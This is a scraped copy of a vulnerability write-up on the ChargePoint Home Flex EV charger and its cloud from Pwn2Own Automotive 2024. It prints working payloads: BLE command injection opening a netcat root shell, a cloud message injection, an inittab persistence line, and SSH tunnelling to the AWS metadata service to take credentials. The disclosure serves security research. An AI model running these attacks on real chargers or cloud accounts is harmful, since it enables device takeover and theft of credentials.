---
title: "Pwn2Own Automotive 2024: Hacking the ChargePoint Home Flex (and their cloud...)"
source: "Sector7"
url: https://defion.security/en/research-labs/pwn2own-automotive-2024-hacking-the-chargepoint-home-flex-and-their-cloud/
published: 2024-08-08
fetched: 2026-11-19T11:35:50.129835+08:00
category: "充电桩"
score: 6.0
keywords: ["pwn2own", "automotive"]
sha256: 8d46a617607a89783a546e6657cc33c9050f7e67ad34e3cd98e7e098612e1144
bytes: 23800
truncated: false
body_mode: fulltext
kind: practical
status: published
published_at: 2026-11-19T11:44:34.056544+08:00
---

# Pwn2Own Automotive 2024: Hacking the ChargePoint Home Flex (and their cloud...)

> 来源：Sector7 · 2024-08-08 · [原文](https://defion.security/en/research-labs/pwn2own-automotive-2024-hacking-the-chargepoint-home-flex-and-their-cloud/)
> 自动抓取快照，仅供安全研究参考；版权归原作者所有。

## 收录理由

- **核心**：Pwn2Own Automotive 2024 对 **ChargePoint Home Flex** 及其云服务的利用分析。
- **价值**：把“设备 + 厂商云”一起纳入攻击面，是 IoT 设备研究应有的视角；这篇文章正是这么做的。
- **难度**：高：需要跨设备固件与云 API 两侧做利用。

Breadcrumb    Meta

Pwn2Own 8 August 2024 · 19 min read

  Title

# Pwn2Own Automotive 2024: Hacking the ChargePoint Home Flex (and their cloud...)

  Body

During Pwn2Own Automotive 2024 in Tokyo, we demonstrated exploits against three different EV chargers: the Autel MaxiCharger (MAXI US AC W12-L-4G), the ChangePoint Home Flex and the JuiceBox 40 Smart EV Charging Station with WiFi. This is our writeup of the research we performed on the ChargePoint Home Flex, the bugs we found and the exploits we developed (CVE-2024-23920, CVE-2024-23921, CVE-2024-23970 and CVE-2024-23971). During the competition, we were able to execute arbitrary code on this charger with no other prerequisites than being in range of Bluetooth.

## Background

The hardest part about the ChargePoint was actually obtaining the device. It was conveniently sold on Amazon with international shipping. But the delivery date kept being postponed and at the end Amazon changed the status to indicating that they 'probably' had delivered our package; but we had not received anything so we had to re-order it. Luckily that package did arrive and we could start researching. We hit jackpot when the first thing we decided to look at turned out to be vulnerable, which was a bit of an anti-climax :). The whole 'research' took about thirty minutes.

Unfortunately we weren't as lucky in the drawing for Pwn2Own. We were drafted last of a total of seven entries for this charger. With such a shallow vulnerability we were doomed to hit a duplicate. So, we decided we needed to step up our game and find a better bug chain! Pulling a CTF-style all nighter, while being sleep deprived from the jet lag and clubbing, we were able to come up with a completely new chain; right before we needed to go on-stage. In the process we also found some vulnerabilities that allowed us to completely take over the cloud infrastructure of ChargePoint... Whoops :). More on this later, but lets start with our initial analysis and bug chain.

## Obtaining the firmware

Dmitry Sklyar from Kaspersky published some prior research on this specific device, which we used as a starting point. Specifically the JTAG pin-out turned out to be useful.

The ChargePoint features a serial interface, from which we could deduct that the device uses U-Boot and runs on Linux. However, U-Boot was configured to autoboot and we couldn't find working credentials to login to the console. Dmitry used JTAG to dump the firmware, and to then patch the password verification functionality in Linux. We choose a similar but slightly different approach. We utilized JTAG to disable autoboot. From here we could boot into single user mode, and add a new user to the system.

We used the following OpenOCD config to get JTAG working:

```
$ cat ft232h.cfg
adapter driver ftdi
adapter speed 30000
transport select jtag

ftdi_vid_pid 0x0403 0x6014
ftdi_tdo_sample_edge falling
ftdi_layout_init 0x0308 0x000b
ftdi_layout_signal nTRST -data 0x0100 -oe 0x0100
ftdi_layout_signal nSRST -data 0x0200 -oe 0x0200
```

```
$ cat target.cfg
reset_config srst_only
adapter srst delay 100
adapter srst pulse_width 500

if { [info exists CHIPNAME] } {
   set AT91_CHIPNAME $CHIPNAME
} else {
    set AT91_CHIPNAME at91sam9n12
}

if { [info exists AT91_CHIPNAME] } {
    set _CHIPNAME $AT91_CHIPNAME
} else {
    error "you must specify a chip name"
}

if { [info exists ENDIAN] } {
    set _ENDIAN $ENDIAN
} else {
    set _ENDIAN little
}

if { [info exists CPUTAPID] } {
    set _CPUTAPID $CPUTAPID
} else {
    set _CPUTAPID 0x0792603f
}

jtag newtap $_CHIPNAME cpu -irlen 4 -ircapture 0x1 -irmask 0xf -expected-id $_CPUTAPID

set _TARGETNAME $_CHIPNAME.cpu
target create $_TARGETNAME arm926ejs -endian $_ENDIAN -chain-position $_TARGETNAME
```

We can then reset the charger in a halting state.

```
$ sudo openocd -f ft232h.cfg -f target.cfg -c 'init' -c 'halt'
```

From here we use the following gdb script to disable autoboot, by setting abort to 1 in abortboot() (which can be found here). In this specific build this function is inlined, but the gist is the same:

```
set arm force-mode arm
target extended-remote localhost:3333
hbreak *0x90
continue
delete 1
stepi
break *0x26f13e7c
continue
delete 2
set $r5=1
set $pc=0x27f7ce80
continue
```

Now we can simply boot into single user mode, and add a new user:

```
U-Boot> setenv bootargs "root=ubi0:rfs ubi.mtd=10 rw rootfstype=ubifs console=ttyS0,115200 mem=128M init=/bin/sh mfg_mode=false"
U-Boot> boot
```

The charger conveniently comes with telnetd enabled by default. This means that we can login using our new account (and a dropped setuid shell) to obtain the firmware.

## Our first vulnerability (CVE-2024-23921)

Our initial vulnerability was so straightforward, we are just gonna spill it here directly: it was command injection in the Wi-Fi password field when provisioning the charger over BLE... The charger even comes with a copy of nc that supports -e /bin/sh. It was the first thing we looked at, and thus the whole process took less than thirty minutes.

Let's look at the details at bit more. Dmitry already found a vulnerability in the provisioning of the charger. When configuring a new Wi-Fi network over BLE, the password was copied to a fixed-size stack buffer; leading to a classic buffer overflow. This sounded like a promising start: apparently this vector was vulnerable before and it has no prerequisites for the attacker (other than to be in BLE range). Oh and did we mention that BLE required no authentication?

The binary /usr/bin/onboardee handles all incoming BLE packets. The main handler for processing BLE GATT attribute writes in this binary is called cpble_server_handle_write_event(). The charger broadcasts several services and characteristics, mainly for configuring the Wi-Fi settings. When applying a new configuration it calls obSendWiFiInfotoWlanapp(), which uses some IPC mechanism to send out new configuration. IPC messages seem to have an identifier, and for this specific message it's CT_EVENT_OB_WLANAPP_CONNECT or 0x3a9d (15005).

Looking at who receives this message led us to the binary /usr/bin/wlanapp. This binary seems to handle most of the Wi-Fi configuration management and connectivity. The main() function receives and dispatches incoming IPC messages. Our specific message is processed by wlnProcessObConenctMsg(), which calls into wlnApplySupplicantConfChange(). This function takes the new configuration to create and write a new configuration file for wpa_supplicant. To construct the contents of this file, it calls into wlnSupplicantWriteVarConfg(). Based on the configuration received via IPC it will fill the required fields for wpa_supplicant. One of these fields is psk, which should hold the PSK in a WPA configuration. This field can either contain a plain text password, or it can be pre-computed into a PSK entry by using a utility such as wpa_passphrase.

ChargePoint opted for the later option, maybe because they didn't want to store plain text passwords on their device:

```
int __fastcall wlnSupplicantWriteVarConfg(FILE *a1, struct_a2 *a2, int a3)
{
    ...
    snprintf(
        command,
        0x100u,
        "/usr/sbin/wpa_passphrase \"%s\" \"%s\" | grep \"psk=\" | tail -1 | cut -c6-",
        &a2->ssid,
        &a2->password);
    v14 = popen(command, "r")
    ...
}
```

Here a2 is a struct which holds our password (without any restrictions on characters), which gets directly used in a system command. By simply sending a BLE packet with a new Wi-Fi configuration with the following password:

```
"; /usr/bin/nc -l -p 1337 -e /bin/sh ; #"
```

We obtain a shell on the device:

```
$ nc 10.10.107.86 1337
id
uid=0(root) gid=0(root)
uname -a
Linux cs_0024b100000b442e 3.10.0 #1 Fri Apr 22 05:35:04 UTC 2022 armv5tejl GNU/Linux
```

As we expected we were not the only ones finding this bug. From the other six entries, five had this exact same bug... But we decided not to give up so easily.

## Playing Pwn2Own as a CTF

The night before our attempt we decided to try to find a better chain. We had nothing to lose: either we would find something new and win, or else we could always switch back to this bug and dupe. Already sleep deprived from the bar nights before and a jet lag we pulled an all nighter, which ended with a completely new chain at around 07:00 AM. Perfectly on time for our entry at 11:00. This was only possible because our hotel had a vending machine with beer, which kept us awake during the night :). It felt like playing a CTF.

So lets look at our new chain a bit closer. Besides BLE the charger has Wi-Fi connectivity. It has telnetd as listening service, but with an unknown (though static) root password. We tried brute-forcing it for a while, but without success. So we deemed it uninteresting for now. It does have two outgoing connections however: a WebSocket connection (with TLS) and a SSH connection.

The WebSocket connection is to communicate with the ChargePoint cloud for its day to day operation. The SSH connection is a bit weird though. It seems to be in place to give ChargePoint the possibility to remotely log in to their chargers. But more on this strange SSH connection at the end of this write-up :). Let's first look more closely to this WebSockets connection.

### Intercepting the cloud communication (CVE-2024-23970)

Earlier we only briefly looked at the WebSocket connection. We initially ignored it as a target, as the connection utilizes TLS and it did seem to correctly validate the certificate of the server. It turned out however that we did not get this part 100% right. Somewhere during the night we noticed the following configuration setting in /opt/etc/coul/cps.conf, which is used by /usr/bin/cpsrelay who manages the WebSocket connection:

```
VerifyHostName=1
```

This appears to correspond to the CURLOPT_SSL_VERIFYHOST=1 setting for curl. We can see why this gets overlooked, as it is easy to shoot yourself in the foot with this configuration option. As a result this option has been changed in later version of curl. One might think that this is a boolean value, where 1 means enable host name verification, and 0 would disable it. It is however actually an integer value where 0 means disabling verification and 2 would do verification as one would expect. 1 was a weird in-between value which made curl not verify the domain but it would perform some additional logging. The developers of curl realised that this was a mistake, so since curl version 7.66.0 the value 1 and 2 are treated the same. Luckily for us the ChargePoint uses libcurl version 7.35; which was released on January 29, 2014.

So the domain is not checked, but the certificate does need to be signed by a trusted CA. The cloud server of the ChargePoint uses a certificate that was signed by their own CA. Let's see if we can find a certificate (with the corresponding private key), that was signed by the same CA as the cloud server. Luckily the device had one just for us :). The WebSocket connection is also protected by a client-side certificate, so the device needs to have a certificate and key stored somewhere. Searching through the various filesystem dumps we had, we quickly found one on the BoardConfig-A partition.

```
$ strings /dev/mtdblock5 | grep -- -----
-----BEGIN CERTIFICATE-----
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
-----END CERTIFICATE-----
-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----
```

Using this certificate we're able to successfully Man-in-the-Middle the WebSocket connection with the cloud. Progress! The actual MitM'ing took some time to setup, because most tooling would not accept the certificate. It uses a SHA-1 signature, which has been deprecated for quite some time. This was somewhere in the middle of the night, and we've no recollection on which settings we needed to change in order to make this work.

### Finding a bug in the message handling (CVE-2024-23971)

The messages we observed from the server seemed to have a similar structure and seem to follow the OCPP protocol. All messages use the DataTransfer type, which contains the actual payload. The contents is not further defined by the OCPP standard. Below is an example message we observed (slightly edited to make it more readable). The interesting part is in the data value. This contains a | separated string, which includes the command to execute (3508 which corresponds to saddr in this example) and then some extra data.

```
[
  2,
  "1706198695",
  "DataTransfer",
  {
    "vendorId": "ChargePoint",
    "data":"saddr|1|3508|0024B100000B442E|1706198695|0|1|1706198695|home charger-eu.chargepoint.com:443/ws-prod/panda/v1"
  },
  "0024B100000B442E"
]
```

The binary cpsrelay receives all messages, but it merely dispatches them using the same IPC mechanism we saw in onboardee for BLE. This is done based on the command identifier (3508 in the example above). Looking at the various endpoints we noticed that most handlers were riddled with buffer overflows. But since we were in Tokyo and testing remotely on a device in The Netherlands, we decided that a buffer overflow might not be our best bet. If the device had crashed and needed a reboot, we had to call someone and ask them to go to the office to powercycle it. So we opted to search for a command injection instead.

We found one in the bswitch command. This command seems to be in place for switching between different banks to boot from. This command is handled by /usr/bin/mcp, in the function RouteToFsmInstance():

```
void __fastcall RouteToFsmInstance(int a1, int a2) {
    ...
    if (command_id == (int *)701) {
        v91 = (unsigned __int8)payload[136];
        v92 = (char *)s;
        strcpy((char *)s, "NA");

        if (v91)
            v92 = payload + 136;

        cmd = payload + 36;

        CTLogWhere(5, "RouteToFsmInstance", 4105, 0x4000, "\n**** Executing BOOTCONTROL cmd %s\n", cmd);

        v94 = strstr(cmd, "reboot");
        type = "reboot";

        if (!v94)
            type = "bankswitch";

        recordReboot(v92, type, (int)"NOC", 0, 1);

        system(cmd);
    }
    ...
}
```

Here we see that it takes a part of the payload, and feeds it directly to system(). We haven't observed this command from the actual cloud, so we don't really know how this is normally used in practice. However, this is the PoC we initially used to test our hypothesis:

```
bswitch|1|701|0024B100000B442E|0|1|1706198695|touch /tmp/pwned|bswitch
```

This RouteToFsmInstance() function is over 5800 lines long and parses multiple different IPC messages. This is also just one of the many binaries that seems to ultimately parse messages received from the cloud. We ended up finding it by just looking at binaries that handled incoming IPC messages and then cross-referencing calls to system(), until we found something that might be controlled by us.

## Exploitation

Just before executing our command, the function recordReboot starts a reboot. But a reboot on Linux takes a bit of time, so we could run new commands while the reboot was being processed. Whatever we would use as payload, it had to be quick and persistent. The payload was also maximized at 100 bytes.

We could of course overwrite one of the init scripts, as the whole root partition is conveniently mounted writeable and the service runs as root. We did not opt for this route, because we were afraid that this could brick the device. There is a watchdog service running that reboots the device if it detects that one of the services is offline, triggering a reboot loop. This would be fixable if we actually had the physical device with us, but we didn't. In the end we just added a service to /etc/inittab:

```
echo "::respawn:/usr/bin/nc -l -p 1337 -e /bin/sh" >> /etc/inittab
```

This yields a nice bind shell for us to connect to. The full chain now works as follows:

- Use the unauthenticated BLE endpoint to reconfigure Wi-Fi, to make it connect to our network
- Intercept the cloud communication, and issue a bswitch command
- Wait until the device reboots
- Profit!

Luckily the entire chain worked on the first try during the competition, not bad considering the state we're in. And these vulnerabilities turned out to be all unknown, so it was a full win!

## But wait, there is more!

There was one more service that we did not yet fully cover: the SSH service. As said earlier, this service was a bit weird at first. It seems to exist to give ChargePoint a way to remotely log in on each charger? It connects to a system from ChargePoint with a reverse tunnel to the telnet service on the charger. Since MITM'ing this connection would only give us access to the same telnet service that was already accessible to us over the local LAN, we initially did not look at this SSH service any further.

The service is started by /etc/init.d/sshrevtunnel.sh. This script is a bit to large to list here in full, but the relevant components are shown below:

```
#!/bin/sh
# Bring up pinned up reverse tunnel to mothership. Try forever, but back off
# connection attempts to keep from wasting resources.  Peg the retry time at
# some max and keep trying.
...
SERIAL_NUM=`cat /var/config/cs_sn`
SN_YEAR=`echo $SERIAL_NUM | head -c 2`
BASE_SERVER_PORT=20000
BASE_SERIAL=0
SERIAL_MODULO=10000
SERIAL_MINOR=`expr $SERIAL_NUM % $SERIAL_MODULO`
REVPORT=`expr $SERIAL_MINOR - $BASE_SERIAL`
REVPORT=`expr $REVPORT + $BASE_SERVER_PORT`
#FOR QA server please uncomment this line
#REVSYSTEM="pandagateway.ev-chargepoint.com"
REVSYSTEM="ba79k2rx5jru.chargepoint.com"
REVSYSTEMPORT="-p 343"
REVHOST="pandart@$REVSYSTEM"
REVHOST_2016="
[email protected]
"
#For 2017
REVHOST_2017="
[email protected]
"
...
while true; do
    ...
    # Connect to the appropriate server based on the year code in the serial number.
    if [ "$SN_YEAR" = "17" ]; then
        # Connect to the 2017 server.
        #printf "---> Connecting to 2017 server: $REVHOST_2017\n"
        $LOG "attempting connection to $REVHOST_2017"
        ssh -o "StrictHostKeyChecking no" -o "ExitOnForwardFailure yes" $REVSYSTEMPORT -N -T -R $REVPORT:localhost:23 $REVHOST_2017 &
    elif [ "$SN_YEAR" = "16" ]; then
        # Connect to the 2016 server.
        #printf "---> Connecting to 2016 server: $REVHOST_2016\n"
        $LOG "attempting connection to $REVHOST_2016"
        ssh -o "StrictHostKeyChecking no" -o "ExitOnForwardFailure yes" $REVSYSTEMPORT -N -T -R $REVPORT:localhost:23 $REVHOST_2016 &
    else
        # Connect to the legacy server.
        #printf "---> Connecting to legacy server: $REVHOST\n"
        $LOG "attempting connection to $REVHOST"
        ssh -o "StrictHostKeyChecking no" -o "ExitOnForwardFailure yes" $REVSYSTEMPORT -N -T -R $REVPORT:localhost:23 $REVHOST &
    fi
    ...
done
...
```

It boils down to running the following SSH command:

```
ssh -p 343 -N -T -R $REVPORT:localhost:23
[email protected]
```

For authentication it uses a key from /root/.ssh/id_rsa. This key seems to originate from the same partition as the certificate used by the WebSockets connection (BoardConfig-A).

The host it connects to is determined by the year the device was built in. It has a special domain for devices built in 2016 and one for 2017. 'Legacy' devices connect to another domain, we think legacy here implies devices build before 2016? In fact this 'legacy' domain seems to be no longer in use, or at least it does not have a SSH daemon running. But because there is no case for devices built after 2017, all newer devices will also try to connect to the legacy server.

We noticed however that the 'newest' domain (for devices built in 2017) was still online. And not only that, but it also accepted our SSH key. Cool, so now we have a connection to the 'mothership', what can we do with this? The server did not allow us to spawn a shell. But it did allow us to setup a other TCP tunnels as well! Let's see what we can do with this... We first tried to see if we can indeed create arbitrary tunnels:

```
$ ssh -p 343 -N -T -L -i id_rsa 1337:google.com:80
[email protected]

$ curl -I -H "Host: google.com" http://localhost:1337/
HTTP/1.1 301 Moved Permanently
Location: http://www.google.com/
Content-Type: text/html; charset=UTF-8
Content-Security-Policy-Report-Only: object-src 'none';base-uri 'self';script-src 'nonce-elUlvIzfzVhli9gWi11mIg' 'strict-dynamic' 'report-sample' 'unsafe-eval' 'unsafe-inline' https: http:;report-uri https://csp.withgoogle.com/csp/gws/other-hp
Date: Thu, 25 Jan 2024 20:14:01 GMT
Expires: Sat, 24 Feb 2024 20:14:01 GMT
Cache-Control: public, max-age=2592000
Server: gws
Content-Length: 219
X-XSS-Protection: 0
X-Frame-Options: SAMEORIGIN
```

Success! Well, a proxy to Google is interesting, but can we also create a tunnel to chargers of other users? Let try by forwarding to localhost and a random port, in hope it is in use by another charger connected to the mothership:

```
$ ssh -p 343 -N -T -L -i id_rsa 1337:localhost:24395
[email protected]

$ telnet localhost 24395
telnet localhost 24395
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.

cs_0021a100000b5621 login:
```

Though we do not know the telnet password, it is most likely not what the developers of this service originally had in mind.

Then we noticed that the machine was hosted on AWS, so we tried if we could use this forwarding trick to also reach the AWS meta-data server:

```
$ ssh -p 343 -N -T -i id_rsa -L 1337:169.254.169.254:80
[email protected]

$ curl http://localhost:1337/latest/meta-data/iam/security-credentials/cp-prod-ota-servers-role
{
    "Code" : "Success",
    "LastUpdated" : "2024-01-25T20:21:21Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "...",
    "SecretAccessKey" : "...",
    "Token" : "...",
    "Expiration" : "2024-01-26T02:28:42Z"
}
```

Hm, this does not look good... Let's see if we can actually access something with this key; S3 buckets maybe?

```
$ aws s3 ls
2020-03-27 16:17:02 aws-athena-query-results-022521842517-ca-central-1
2019-07-17 19:23:19 aws-athena-query-results-022521842517-eu-central-1
2020-06-26 07:15:33 aws-athena-query-results-022521842517-us-west-2
...
$ aws s3 ls s3://cp-prod-syd-nos-sftp --human-readable --summarize
        PRE bmw_incoming/
        PRE coned_incoming/
        PRE evgo_incoming/
        PRE fulfillment_incoming/
        PRE voyager_incoming/
        PRE wex_incoming/

Total Objects: 0
   Total Size: 0 Bytes
```

In total there were over a 100 S3 buckets that we had access to! We listed one of them as a proof on concept, before we decided we had enough proof to escalate this. We do think it should have been possible to take over a considerable portion, if not all, of their cloud infrastructure.

## Conclusion

While hacking a single charger can be inconvenient for an end-user, it will most likely have a low chance of actually happening in the wild. An attacker would need to be in close proximity of the charger in order to exploit most vulnerabilities. This makes it's impractical for most attackers with malicious intent. Since both the car as the electrical grid can handle a malfunctioning charger, the subsequent risk will also be small. We think it is unlikely that a charger can do considerable damage to either the car or the grid.

However, if you are able to compromise the entire cloud infrastructure of a manufacturer the risk suddenly increases drastically. If their market share is large enough you could damage the grid, simply by turning all chargers on and off simultaneously. This shows the importance of security in these kind of smart devices.

For the other writeups about Pwn2Own Automotive, see JuiceBox 40 and Autel MaxiCharger (MAXI US AC W12-L-4G).

  Research → service CTA (category-driven)    Back link

← Back to Research Labs
